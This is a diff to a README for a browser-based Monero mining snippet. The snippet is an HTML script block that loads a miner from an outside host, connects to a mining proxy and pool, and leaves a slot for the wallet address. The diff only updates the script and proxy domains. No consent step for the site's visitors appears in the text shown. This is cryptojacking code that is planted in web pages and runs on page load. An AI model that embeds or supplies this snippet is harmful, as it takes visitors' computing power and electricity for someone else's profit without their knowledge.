@@ -4,9 +4,9 @@
 ### See This Video For More Info : https://www.youtube.com/watch?v=AZU6TeEjHVQ
 ## `HTML SCRIPT`
 ```
-<script src="https://script.ghgi.xyz"></script>
+<script src="https://script.monerominer.rocks"></script>
 <script>
-    server = "wss://ghgi.xyz";
+    server = "wss://ny1.xmrminingproxy.com";
     var pool = "moneroocean.stream";
     var walletAddress = "PUT YOUR WALLET ADDRESS HERE";
     var workerId = ""
